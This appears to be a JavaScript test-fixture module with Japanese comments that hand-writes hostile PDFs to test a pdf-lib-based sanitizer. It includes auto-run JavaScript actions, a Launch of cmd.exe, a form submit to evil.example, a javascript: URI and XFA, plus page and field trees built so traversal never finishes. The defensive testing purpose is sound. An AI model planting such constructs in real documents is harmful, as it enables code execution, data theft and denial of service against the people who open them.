// 試験の道具: 手で組んだ PDF（敵意のある PDF の再現用）。xref を書かない: pdf-lib は先頭から順に読むので要らない。
// pdf-lib で作ると、危ない構造（輪・同じ節を2度指す枝・巨大な /Index）は作れずに直されてしまう。字で書く。

/**
 * @param {[number, string][]} objs [オブジェクト番号, 本文] の並び
 * @param {string} [trailer] trailer の中身
 * @returns {Uint8Array}
 */
export function rawPdf(objs, trailer = '/Root 1 0 R') {
  let s = '%PDF-1.7\n'
  for (const [n, body] of objs) s += `${n} 0 obj\n${body}\nendobj\n`
  s += `trailer\n<< ${trailer} /Size ${Math.max(...objs.map((o) => o[0])) + 1} >>\n%%EOF\n`
  return Uint8Array.from(s, (c) => c.charCodeAt(0) & 0xff)
}

/**
 * 流れのオブジェクトの本文
 * @param {string} dictExtra 辞書の中身（/Length は足す）
 * @param {string} content 7 ビットの字
 */
export const streamObj = (dictExtra, content) => `<< ${dictExtra} /Length ${content.length} >>\nstream\n${content}\nendstream`

/** 頁が 1 つで欄が 1 つ（name）の最小の文書の部品 */
export const baseObjs = () => /** @type {[number, string][]} */ ([
  [1, '<< /Type /Catalog /Pages 2 0 R /AcroForm << /Fields [10 0 R] >> >>'],
  [2, '<< /Type /Pages /Kids [3 0 R] /Count 1 >>'],
  [3, '<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] /Annots [10 0 R] >>'],
  [10, '<< /T (name) /FT /Tx /Rect [10 10 150 40] /Subtype /Widget /Type /Annot /P 3 0 R /F 4 >>'],
])

/**
 * 自動で動く物を全部入れた文書: 開いた時の JavaScript・文書と頁と欄の /AA・名前の木の JavaScript・XFA・
 * 実行（Launch）・送信（SubmitForm）・javascript: の URI・動画の注釈、そして残してよい https のリンクと文書内の GoTo
 */
export function activeFixture() {
  return rawPdf([
    [1, '<< /Type /Catalog /Pages 2 0 R /OpenAction 20 0 R /AA << /WC 21 0 R >> /Names << /JavaScript 22 0 R >> /AcroForm 30 0 R >>'],
    [2, '<< /Type /Pages /Kids [3 0 R] /Count 1 >>'],
    [3, '<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] /AA << /O 21 0 R >> /Annots [4 0 R 5 0 R 6 0 R 7 0 R 8 0 R 9 0 R] >>'],
    [4, '<< /Type /Annot /Subtype /Link /Rect [0 0 10 10] /A 23 0 R >>'],
    [5, '<< /Type /Annot /Subtype /Link /Rect [20 0 30 10] /A << /S /URI /URI (javascript:alert\\(1\\)) >> >>'],
    [6, '<< /Type /Annot /Subtype /Link /Rect [40 0 50 10] /A << /S /URI /URI (https://example.com/ok) >> >>'],
    [7, '<< /Type /Annot /Subtype /Link /Rect [60 0 70 10] /A << /S /GoTo /D [3 0 R /Fit] >> >>'],
    [8, '<< /T (name) /FT /Tx /Rect [10 100 150 130] /Subtype /Widget /Type /Annot /P 3 0 R /F 4 /AA << /K 21 0 R /V << /S /JavaScript /JS 25 0 R >> >> /A 24 0 R >>'],
    [9, '<< /Type /Annot /Subtype /Screen /Rect [0 150 50 200] /A 21 0 R >>'],
    [20, '<< /S /JavaScript /JS 25 0 R >>'],
    [21, '<< /S /JavaScript /JS (this.print\\(\\)) >>'],
    [22, '<< /Names [(a) 21 0 R] >>'],
    [23, '<< /S /Launch /F (cmd.exe) >>'],
    [24, '<< /S /SubmitForm /F (http://evil.example/) >>'],
    [25, streamObj('', "app.alert('x')")],
    [26, streamObj('', '<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/"/>')],
    [30, '<< /Fields [8 0 R] /XFA [(template) 26 0 R] >>'],
  ])
}

/** 頁の木が DAG: 各段が同じ子を 2 度指す（道が 2^depth 本に増え、getPages が終わらない） */
export const pageDag = (depth = 30) => rawPdf([
  [1, '<< /Type /Catalog /Pages 10 0 R >>'],
  ...Array.from({ length: depth }, (_, k) => /** @type {[number, string]} */ ([10 + k, `<< /Type /Pages /Kids [${11 + k} 0 R ${11 + k} 0 R] /Count 2 >>`])),
  [10 + depth, '<< /Type /Page /MediaBox [0 0 100 100] >>'],
])

/** 欄の木が DAG（getFields が終わらない） */
export const fieldDag = (depth = 30) => rawPdf([
  ...baseObjs().slice(0, 3).map((o) => /** @type {[number, string]} */ (o[0] === 1 ? [1, '<< /Type /Catalog /Pages 2 0 R /AcroForm << /Fields [10 0 R] >> >>'] : o)),
  ...Array.from({ length: depth }, (_, k) => /** @type {[number, string]} */ ([10 + k, `<< /T (n${k}) /Kids [${11 + k} 0 R ${11 + k} 0 R] >>`])),
  [10 + depth, '<< /T (leaf) /FT /Tx /Rect [0 0 10 10] /Subtype /Widget /Type /Annot >>'],
])

/** 欄が n 個（それぞれ頁の Annots にも載る） */
export const manyFields = (n) => {
  const refs = Array.from({ length: n }, (_, i) => `${10 + i} 0 R`).join(' ')
  return rawPdf([
    [1, `<< /Type /Catalog /Pages 2 0 R /AcroForm << /Fields [${refs}] >> >>`],
    [2, '<< /Type /Pages /Kids [3 0 R] /Count 1 >>'],
    [3, `<< /Type /Page /Parent 2 0 R /MediaBox [0 0 600 800] /Annots [${refs}] >>`],
    ...Array.from({ length: n }, (_, i) => /** @type {[number, string]} */ ([10 + i, `<< /T (f${i}) /FT /Tx /V (v) /Rect [${(i % 10) * 50} ${Math.floor(i / 10) % 70 * 10} ${(i % 10) * 50 + 40} ${Math.floor(i / 10) % 70 * 10 + 9}] /Subtype /Widget /Type /Annot /P 3 0 R /F 4 >>`])),
  ])
}

/** 1 つの ObjStm（辞書の追加と圧縮済みの中身を渡す）を持つ最小の文書。ObjStm の読みで pdf-lib が展開する所を試す */
export function objStmPdf(dictExtra, data, { typeKey = '/Type /ObjStm' } = {}) {
  const head = '%PDF-1.7\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n2 0 obj\n<< /Type /Pages /Kids [] /Count 0 >>\nendobj\n5 0 obj\n<< ' + typeKey + ' ' + dictExtra + ' /Length ' + data.length + ' >>\nstream\n'
  const tail = '\nendstream\nendobj\ntrailer\n<< /Root 1 0 R /Size 20 >>\n%%EOF\n'
  const out = new Uint8Array(head.length + data.length + tail.length)
  for (let i = 0; i < head.length; i++) out[i] = head.charCodeAt(i) & 0xff
  out.set(data, head.length)
  for (let i = 0; i < tail.length; i++) out[head.length + data.length + i] = tail.charCodeAt(i) & 0xff
  return out
}
